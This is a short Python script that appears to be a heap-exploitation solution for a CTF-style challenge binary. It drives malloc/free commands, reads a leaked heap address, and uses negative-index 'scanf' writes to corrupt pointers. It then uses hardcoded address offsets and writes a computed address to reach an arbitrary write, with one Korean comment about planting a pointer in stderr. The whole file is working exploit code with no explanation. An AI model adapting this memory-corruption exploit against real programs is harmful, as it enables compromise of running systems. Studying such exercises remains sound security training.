import sys

lines = "malloc 0\nfree 0\nmalloc 12\nfree 12\nmalloc 14\nmalloc 16\nprintf -7\n"
lines = lines.split("\n")
for line in lines:
    sys.stdout.buffer.write(line.encode() +b'\n')
addr = int(input(),16)
addr += 0x19 #0x~021
sys.stdout.buffer.write(b"scanf -7\n")
sys.stdout.buffer.write(addr.to_bytes(8,'little') + b'\n')
sys.stdout.buffer.write(b"printf -7\n")

#stderr에 새로운 포인터를 저장.
addr2 = addr >> 8
sys.stdout.buffer.write(b"scanf -7\n")
sys.stdout.buffer.write(addr2.to_bytes(8,'little') + b'\n')

offset = 0x7fb86355f000 - 0x7fb86336e845
loc = (int(input(),16) >> 4) << 12
sys.stderr.write(hex(loc)+"\n")
loc -= offset
sys.stderr.write(hex(offset)+"\n")
sys.stderr.write(hex(loc)+"\n")
sys.stdout.buffer.write(b"scanf -4\n")
sys.stdout.buffer.write(loc.to_bytes(8,'little') + b'\n')
sys.stdout.buffer.write(b"printf 16\n")

